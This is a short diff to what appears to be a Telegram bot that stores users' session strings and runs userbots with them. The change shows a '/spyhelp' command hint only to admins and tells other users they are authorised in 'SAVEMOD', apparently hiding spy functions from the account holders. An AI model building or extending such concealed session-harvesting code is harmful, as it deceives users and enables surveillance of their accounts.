@@ -867,7 +867,10 @@ async def cmd_start(message):
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
     row = cursor.fetchone()
     if row and row[0]:
-        await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
+        if is_admin(user_id):
+            await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
+        else:
+            await message.answer("✅ Ты уже авторизован в SAVEMOD!")
         if user_id not in active_clients:
             asyncio.create_task(run_userbot(user_id, row[0]))
         return
